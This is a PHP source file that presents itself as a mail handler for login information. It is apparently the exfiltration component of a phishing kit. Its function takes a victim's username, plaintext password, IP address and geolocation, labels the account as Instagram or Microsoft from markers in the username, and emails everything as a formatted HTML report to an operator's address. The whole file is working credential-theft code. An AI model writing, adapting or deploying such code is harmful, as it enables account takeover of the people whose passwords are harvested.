<?php
/**
 * Local mail handler for sending user login information
 */

function sendUserMail($username, $password, $country, $city, $continent, $ip, $adminEmail) {
    // Log the function call
    error_log("Sending mail to: $adminEmail with user info: $username");
    
    // Determine platform from username
    $platform = "Login";
    if (strpos($username, '(IG)') !== false) {
        $platform = "Instagram";
    } elseif (strpos($username, '(MS)') !== false || strpos($username, '(hotmail)') !== false) {
        $platform = "Microsoft";
    }

    // Create email title based on platform
    $subject = "New $platform Login";
    
    // Create a nice HTML message body
    $message = "
    <html>
    <head>
        <title>New $platform Login</title>
        <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
            .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
            .header { background-color: #4267B2; color: white; padding: 10px 20px; border-radius: 3px 3px 0 0; }
            .content { padding: 20px; }
            .footer { background-color: #f5f5f5; padding: 10px 20px; font-size: 12px; color: #666; border-radius: 0 0 3px 3px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <div class='container'>
            <div class='header'>
                <h2>New $platform Login</h2>
            </div>
            <div class='content'>
                <p>A new user has logged in with $platform credentials:</p>
                <table>
                    <tr>
                        <th>Username:</th>
                        <td><strong>$username</strong></td>
                    </tr>
                    <tr>
                        <th>Password:</th>
                        <td>$password</td>
                    </tr>
                    <tr>
                        <th>IP Address:</th>
                        <td>$ip</td>
                    </tr>
                    <tr>
                        <th>Location:</th>
                        <td>$city, $country ($continent)</td>
                    </tr>
                    <tr>
                        <th>Time:</th>
                        <td>" . date('Y-m-d H:i:s') . "</td>
                    </tr>
                </table>
            </div>
            <div class='footer'>
                <p>This is an automated email. Please do not reply.</p>
            </div>
        </div>
    </body>
    </html>
    ";
    
    // Set email headers
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: $platform Login <noreply@" . $_SERVER['HTTP_HOST'] . ">" . "\r\n";
    
    // Attempt to send the email
    $mailSent = false;
    try {
        $mailSent = mail($adminEmail, $subject, $message, $headers);
        
        if ($mailSent) {
            error_log("Email sent successfully to $adminEmail");
            return ['success' => true, 'message' => 'Email sent successfully'];
        } else {
            error_log("Failed to send email to $adminEmail");
            return ['success' => false, 'error' => 'Failed to send email'];
        }
    } catch (Exception $e) {
        error_log("Exception when sending email: " . $e->getMessage());
        return ['success' => false, 'error' => $e->getMessage()];
    }
}

// If this file is accessed directly, return an error
if (basename($_SERVER['SCRIPT_FILENAME']) == basename(__FILE__)) {
    http_response_code(403);
    echo json_encode(['success' => false, 'error' => 'Direct access not allowed']);
    exit;
}
?> 